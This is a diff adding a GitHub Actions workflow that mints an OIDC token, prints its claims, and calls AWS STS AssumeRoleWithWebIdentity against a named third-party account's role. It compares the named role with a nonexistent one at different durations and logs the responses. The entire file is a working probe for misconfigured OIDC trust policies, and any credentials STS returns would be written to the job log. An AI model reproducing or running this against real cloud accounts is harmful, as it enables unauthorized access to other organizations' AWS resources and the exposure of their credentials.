@@ -1,0 +1,42 @@
+name: w11probe
+on:
+  workflow_dispatch:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: mint and probe
+        run: |
+          set -euo pipefail
+          TOKEN=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
+          echo "$TOKEN" > /tmp/t.jwt
+          python3 - <<'PY'
+          import base64, json, urllib.parse, urllib.request, urllib.error, time
+          t = open('/tmp/t.jwt').read().strip()
+          for p in t.split('.')[:2]:
+              p += '=' * (-len(p) % 4)
+              print('CLAIM', json.dumps(json.loads(base64.urlsafe_b64decode(p)), sort_keys=True))
+          def sts(acct, role, dur, label):
+              data=urllib.parse.urlencode({
+                  'Action':'AssumeRoleWithWebIdentity','Version':'2011-06-15',
+                  'RoleArn':f'arn:aws:iam::{acct}:role/{role}',
+                  'RoleSessionName':'w11b09','DurationSeconds':str(dur),
+                  'WebIdentityToken':t}).encode()
+              req=urllib.request.Request('https://sts.amazonaws.com/', data=data, method='POST',
+                  headers={'Content-Type':'application/x-www-form-urlencoded','User-Agent':'w11b09'})
+              try:
+                  with urllib.request.urlopen(req, timeout=10) as r:
+                      body=r.read().decode('utf-8','replace'); code=r.status
+              except urllib.error.HTTPError as e:
+                  body=e.read().decode('utf-8','replace'); code=e.code
+              print(f'ARM|{label}|{code}|{len(body)}')
+              print(body.replace('\n',' ')[:700])
+              time.sleep(0.5)
+          sts('114563866192','talos-gha-OriginProtocol-origin-dollar',43200,'A_existing_12h')
+          sts('114563866192','w6probe-does-not-exist',43200,'B_missing_12h')
+          sts('114563866192','talos-gha-OriginProtocol-origin-dollar',3600,'C_existing_1h')
+          sts('114563866192','w6probe-does-not-exist',3600,'D_missing_1h')
+          PY
